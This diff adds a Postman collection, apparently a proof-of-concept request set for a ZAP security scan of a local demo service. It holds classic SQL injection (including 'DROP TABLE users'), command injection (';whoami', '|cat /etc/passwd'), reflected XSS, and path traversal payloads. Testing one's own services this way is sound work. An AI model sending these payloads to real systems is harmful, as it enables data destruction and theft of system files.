@@ -1,0 +1,678 @@
+{
+	"info": {
+		"_postman_id": "8501328d-fe33-494f-a230-4cb7dc901c65",
+		"name": "PocZAP",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "34066993"
+	},
+	"item": [
+		{
+			"name": "SQL Injection",
+			"item": [
+				{
+					"name": "http://poc-zap-service:9999/api/users?id=1' OR '1'='1",
+					"request": {
+						"method": "GET",
+						"header": []
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/users?id=1; DROP TABLE users",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/users?id=1; DROP TABLE users",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"users"
+							],
+							"query": [
+								{
+									"key": "id",
+									"value": "1; DROP TABLE users"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Regular",
+			"item": [
+				{
+					"name": "http://poc-zap-service:9999/api/users?id=1",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/users?id=1",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"users"
+							],
+							"query": [
+								{
+									"key": "id",
+									"value": "1"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/users?id=admin",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/users?id=admin",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"users"
+							],
+							"query": [
+								{
+									"key": "id",
+									"value": "admin"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/users?id=' or '1'='1",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/users?id=' or '1'='1",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"users"
+							],
+							"query": [
+								{
+									"key": "id",
+									"value": "' or '1'='1"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/public",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/public",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"public"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/ping?host=localhost",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/ping?host=localhost",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"ping"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "localhost"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/ping?host=127.0.0.1",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/ping?host=127.0.0.1",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"ping"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "127.0.0.1"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/ping?host=google.com",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/ping?host=google.com",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"ping"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "google.com"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/ping?host=;ls -la",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/ping?host=;ls -la",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"ping"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": ";ls -la"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/hello",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/hello",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"hello"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/hello?name=World",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/hello?name=World",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"hello"
+							],
+							"query": [
+								{
+									"key": "name",
+									"value": "World"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/hello?name=<script>alert(1)</script>",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/hello?name=<script>alert(1)</script>",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"hello"
+							],
+							"query": [
+								{
+									"key": "name",
+									"value": "<script>alert(1)</script>"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/health",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/health",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"health"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/greet?username=testuser",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/greet?username=testuser",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"greet"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "testuser"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/greet?username=admin",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/greet?username=admin",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"greet"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "admin"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/greet?username=<img src=x onerror=alert(1)>",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/greet?username=<img src=x onerror=alert(1)>",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"greet"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "<img src=x onerror=alert(1)>"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/admin/env",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/admin/env",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"admin",
+								"env"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Command Injection",
+			"item": [
+				{
+					"name": "http://poc-zap-service:9999/api/ping?host=localhost;whoami",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/ping?host=localhost;whoami",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"ping"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "localhost;whoami"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/ping?host=127.0.0.1&&ls%20-la",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/ping?host=127.0.0.1&&ls%20-la",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"ping"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "127.0.0.1"
+								},
+								{
+									"key": null,
+									"value": null
+								},
+								{
+									"key": "ls%20-la",
+									"value": null
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/ping?host=google.com|cat%20/etc/passwd",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/ping?host=google.com|cat%20/etc/passwd",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"ping"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "google.com|cat%20/etc/passwd"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Reflected XSS",
+			"item": [
+				{
+					"name": "http://poc-zap-service:9999/api/greet?username=<script>alert(1)</script>",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/greet?username=<script>alert(1)</script>",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"greet"
+							],
+							"query": [
+								{
+									"key": "username",
+									"value": "<script>alert(1)</script>"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/hello?name=<img src=x onerror=alert(1)>",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/hello?name=<img src=x onerror=alert(1)>",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"hello"
+							],
+							"query": [
+								{
+									"key": "name",
+									"value": "<img src=x onerror=alert(1)>"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Path Traversal",
+			"item": [
+				{
+					"name": "http://poc-zap-service:9999/api/users?id=../../../../etc/passwd",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/users?id=../../../../etc/passwd",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"users"
+							],
+							"query": [
+								{
+									"key": "id",
+									"value": "../../../../etc/passwd"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "http://poc-zap-service:9999/api/ping?host=../../../../etc/passwd",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/ping?host=../../../../etc/passwd",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"ping"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "../../../../etc/passwd"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Sensitive Info Exposure",
+			"item": [
+				{
+					"name": "http://poc-zap-service:9999/api/admin/env",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://poc-zap-service:9999/api/admin/env",
+							"protocol": "http",
+							"host": [
+								"localhost"
+							],
+							"port": "9999",
+							"path": [
+								"api",
+								"admin",
+								"env"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		}
+	]
+}
